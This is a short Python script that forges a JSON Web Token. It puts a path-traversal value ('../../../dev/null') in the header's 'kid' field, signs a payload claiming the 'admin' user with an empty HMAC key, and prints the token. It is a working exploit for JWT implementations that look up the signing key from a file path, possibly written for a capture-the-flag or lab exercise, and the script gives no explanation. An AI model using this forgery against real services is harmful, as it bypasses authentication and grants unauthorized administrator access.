import hmac
import base64
import hashlib
import json

header = {"typ":"JWT","alg":"HS256","kid":"../../../dev/null"}
key = ""

payload = {"user":"admin"}

str = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='UTF-8')).decode('UTF-8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='UTF-8')).decode('UTF-8').rstrip("=")

sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='UTF-8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print (str+"."+sig)